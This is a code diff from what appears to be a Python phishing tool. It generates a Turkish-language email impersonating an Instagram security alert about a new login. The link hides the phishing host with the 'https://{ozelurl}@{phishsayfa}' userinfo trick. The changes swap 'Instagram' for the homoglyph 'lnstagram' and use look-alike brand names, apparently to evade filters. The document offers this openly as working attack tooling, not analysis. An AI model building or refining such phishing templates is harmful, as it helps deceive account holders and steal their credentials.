@@ -71,7 +71,7 @@ else:
 
                 data_mail = {
                     'to': to,
-                    'subject': "İnstagram Hesabınıza Yeni Giriş Tespit Edildi!",
+                    'subject': "lnstagram Hesabınıza Yeni Giriş Tespit Edildi!",
                     'body': f'''
 		
  
@@ -82,7 +82,7 @@ Genellikle kullanmadığınız bir cihazdan giriş yapıldığını fark ettik.
  
 
  
-POCO X3 PRO · Instagram · Istanbul, Turkey
+POCO X3 PRO · lnstagram · Istanbul, Turkey
  
  
 Bu kişi sizseniz, birkaç gün boyunca belirli güvenlik ve hesap ayarlarına erişemeyeceksiniz. Bu ayarlara daha önce giriş yaptığınız bir cihazdan yine erişebilirsiniz.
@@ -92,7 +92,7 @@ Bu kişi siz değilseniz, Hesabınızı Kurtarmak İçin!
 Hesabınızı Kurtarmak İçin: https://{ozelurl}@{phishsayfa}
    
 
-© Inqtagram. Meto Platforms, Inc., 1701 Willow Road, Menlo Park, CA 94025
+© Inqtagram. Meto Platforms, Inc., 1701 Willow Road, Menlo Park, CA 95025
 Bu mesaj {to} adresine {kullanicismi} için gönderilmiştir. Bu sizin hesabınız değil mi? Bu hesaptan e-posta adresinizi kaldırın.
                 '''
                 }
